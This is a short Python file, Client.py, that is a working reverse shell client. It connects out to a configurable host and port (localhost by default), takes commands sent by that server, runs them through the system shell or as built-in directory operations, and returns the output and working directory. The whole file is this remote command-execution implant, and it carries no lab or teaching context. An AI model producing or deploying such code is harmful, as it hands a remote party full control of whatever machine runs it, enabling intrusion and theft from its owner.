# Client.py
import socket
from subprocess import PIPE, Popen
import os

class Client:
    def __init__(self, host='127.0.0.1', port=8888, bufsize=2048):
        import socket
        self.bufsize = bufsize
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))

        try:
            while True:
                command = self.sock.recv(self.bufsize)
                if not command:
                    break

                command = command.decode().strip()
                if command.lower() == "disconnect":
                    break

                response = ""
                if command.startswith("cd "):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        response = f"[+] Changed directory to {os.getcwd()}"
                    except Exception as e:
                        response = f"[ERROR] {e}"

                elif command.startswith("mkdir "):
                    try:
                        path = command[6:].strip()
                        os.mkdir(path)
                        response = f"[+] Directory '{path}' created."
                    except Exception as e:
                        response = f"[ERROR] {e}"

                elif command.startswith("rmdir "):
                    try:
                        path = command[6:].strip()
                        os.rmdir(path)
                        response = f"[+] Directory '{path}' removed."
                    except Exception as e:
                        response = f"[ERROR] {e}"

                else:
                    proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, text=True)
                    stdout, stderr = proc.communicate()
                    response = stdout
                    if stderr:
                        response += ("\n[STDERR]\n" + stderr)

                if not response.strip():
                    response = "[+] Command executed."
                    
                final = f"{response}\n<cwd>{os.getcwd()}</cwd>"
                self.sock.send(final.encode())
        finally:
            try:
                self.sock.close()
            except:
                pass

if __name__ == "__main__":
    Client(host='127.0.0.1', port=8888)
